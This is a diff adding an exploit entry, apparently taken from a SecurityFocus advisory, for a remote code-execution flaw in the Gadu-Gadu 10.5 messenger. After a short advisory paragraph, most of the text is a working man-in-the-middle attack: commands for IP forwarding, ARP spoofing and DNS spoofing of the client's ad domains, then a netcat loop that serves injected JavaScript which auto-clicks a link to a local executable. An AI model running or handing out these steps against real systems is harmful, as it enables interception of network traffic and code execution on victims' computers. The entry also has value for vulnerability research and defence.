@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/48030/info
+
+Gadu-Gadu is prone to a remote code-execution vulnerability.
+
+Successful exploits will allow remote attackers to execute arbitrary code within the context of the affected application.
+
+Gadu-Gadu 10.5 is affected; other versions may also be vulnerable. 
+
+# echo 1 > /proc/sys/net/ipv4/ip_forward
+# arp -s GW_IP GW_MAC
+# arpspoof -i eth0 GW_IP
+# echo "YOURIP *.adocean.pl" > /tmp/x
+# dnsspoof -i eth0 -f /tmp/x
+# while [ 1 ] ; do echo -ne "HTTP/1.0 200 OK\r\nConnection:
+close\r\nContent-Length: 239\r\nContent-Type:
+text/html\r\n\r\nb=document.getElementsByTagName(\"body\").item(0);\r\nb.innerHTML='<a
+id=\"a\" href=\"c:/windows/notepad.exe\"></a>';\r\na=document.getElementById('a');\r\ne=document.createEvent('HTMLEvents');\r\ne.initEvent('click',
+true, true);\r\na.dispatchEvent(e);\r\n" | nc -l 80 ; done 
